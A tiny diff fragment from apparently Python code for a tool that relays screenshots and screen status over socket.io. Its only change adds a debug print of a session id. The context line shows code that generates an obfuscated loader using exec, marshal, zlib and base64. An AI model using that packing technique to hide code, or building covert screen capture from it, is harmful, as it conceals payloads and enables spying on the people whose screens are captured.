@@ -245,5 +245,6 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         self.sio.emit('screen_status', data)
 
     def screenshot_taken(self, sid, data):
+        print(sid)
         sio.emit("screenshot", data)
 
